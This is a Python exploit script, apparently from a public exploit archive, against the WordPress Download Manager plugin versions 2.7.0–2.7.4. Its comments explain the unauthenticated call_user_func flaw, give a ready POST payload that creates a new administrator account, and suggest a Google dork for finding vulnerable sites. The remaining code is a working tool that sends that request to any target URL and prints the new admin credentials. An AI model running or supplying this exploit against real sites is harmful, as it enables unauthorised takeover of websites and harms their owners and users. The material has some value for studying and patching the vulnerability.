#!/usr/bin/python
#
# Exploit Name: Wordpress Download Manager 2.7.0-2.7.4 Remote Command Execution
#
# Vulnerability discovered by SUCURI TEAM (http://blog.sucuri.net/2014/12/security-advisory-high-severity-wordpress-download-manager.html)
#
# Exploit written by Claudio Viviani
#
#
# 2014-12-03:  Discovered vulnerability
# 2014-12-04:  Patch released (2.7.5)
#
# Video Demo: https://www.youtube.com/watch?v=rIhF03ixXFk
#
# --------------------------------------------------------------------
#
# The vulnerable function is located on "/download-manager/wpdm-core.php" file:
#
# function wpdm_ajax_call_exec()
# {
#    if (isset($_POST['action']) && $_POST['action'] == 'wpdm_ajax_call') {
#         if (function_exists($_POST['execute']))
#             call_user_func($_POST['execute'], $_POST);
#         else
#             echo "function not defined!";
#         die();
#     }
# }
#
# Any user from any post/page can call wpdm_ajax_call_exec() function (wp hook).
# wpdm_ajax_call_exec() call functions by call_user_func() through POST data:
#
#         if (function_exists($_POST['execute']))
#             call_user_func($_POST['execute'], $_POST);
#         else
#         ...
#         ...
#         ...
#
# $_POST data needs to be an array
#
#
# The wordpress function wp_insert_user is perfect:
#
# http://codex.wordpress.org/Function_Reference/wp_insert_user
#
# Description
#
# Insert a user into the database.
#
# Usage
#
# <?php wp_insert_user( $userdata ); ?>
#
# Parameters
#
# $userdata
#     (mixed) (required) An array of user data, stdClass or WP_User object.
#        Default: None
#
#
#
# Evil POST Data (Add new Wordpress Administrator):
#
# action=wpdm_ajax_call&execute=wp_insert_user&user_login=NewAdminUser&user_pass=NewAdminPassword&role=administrator
#
# ---------------------------------------------------------------------
#
# Dork google:  index of "wordpress-download"
#
# Tested on Wordpress Download Manager from 2.7.0 to 2.7.4 version with BackBox 3.x and python 2.6
#
# Http connection
import urllib, urllib2, socket
#
import sys
# String manipulator
import string, random
# Args management
import optparse

# Check url
def checkurl(url):
    if url[:8] != "https://" and url[:7] != "http://":
        print('[X] You must insert http:// or https:// procotol')
        sys.exit(1)
    else:
        return url

# Check if file exists and has readable
def checkfile(file):
    if not os.path.isfile(file) and not os.access(file, os.R_OK):
        print '[X] '+file+' file is missing or not readable'
        sys.exit(1)
    else:
        return file

def id_generator(size=6, chars=string.ascii_uppercase + string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

banner = """
    ___ ___               __
   |   Y   .-----.----.--|  .-----.----.-----.-----.-----.
   |.  |   |  _  |   _|  _  |  _  |   _|  -__|__ --|__ --|
   |. / \  |_____|__| |_____|   __|__| |_____|_____|_____|
   |:      |    ______      |__|              __                __
   |::.|:. |   |   _  \ .-----.--.--.--.-----|  .-----.---.-.--|  |
   `--- ---'   |.  |   \|  _  |  |  |  |     |  |  _  |  _  |  _  |
               |.  |    |_____|________|__|__|__|_____|___._|_____|
               |:  1    /   ___ ___
               |::.. . /   |   Y   .---.-.-----.---.-.-----.-----.----.
               `------'    |.      |  _  |     |  _  |  _  |  -__|   _|
                           |. \_/  |___._|__|__|___._|___  |_____|__|
                           |:  |   |                 |_____|
                           |::.|:. |
                           `--- ---'
                                                   Wordpress Download Manager
                                                      R3m0t3 C0d3 Ex3cut10n
                                                         (Add WP Admin)
                                                          v2.7.0-2.7.4

                               Written by:

                             Claudio Viviani

                          http://www.homelab.it

                             info@homelab.it
                         homelabit@protonmail.ch

                   https://www.facebook.com/homelabit
                      https://twitter.com/homelabit
                    https://plus.google.com/+HomelabIt1/
           https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
"""

commandList = optparse.OptionParser('usage: %prog -t URL [--timeout sec]')
commandList.add_option('-t', '--target', action="store",
                  help="Insert TARGET URL: http[s]://www.victim.com[:PORT]",
                  )
commandList.add_option('--timeout', action="store", default=10, type="int",
                  help="[Timeout Value] - Default 10",
                  )

options, remainder = commandList.parse_args()

# Check args
if not options.target:
    print(banner)
    commandList.print_help()
    sys.exit(1)

host = checkurl(options.target)
timeout = options.timeout

print(banner)

socket.setdefaulttimeout(timeout)

username = id_generator()
pwd = id_generator()

body = urllib.urlencode({'action' : 'wpdm_ajax_call',
                         'execute' : 'wp_insert_user',
                         'user_login' : username,
                         'user_pass' : pwd,
                         'role' : 'administrator'})

headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36'}

print "[+] Tryng to connect to: "+host
try:
    req = urllib2.Request(host+"/", body, headers)
    response = urllib2.urlopen(req)
    html = response.read()

    if html == "":
       print("[!] Account Added")
       print("[!] Location: "+host+"/wp-login.php")
       print("[!] Username: "+username)
       print("[!] Password: "+pwd)
    else:
       print("[X] Exploitation Failed :(")

except urllib2.HTTPError as e:
    print("[X] "+str(e))
except urllib2.URLError as e:
    print("[X] Connection Error: "+str(e))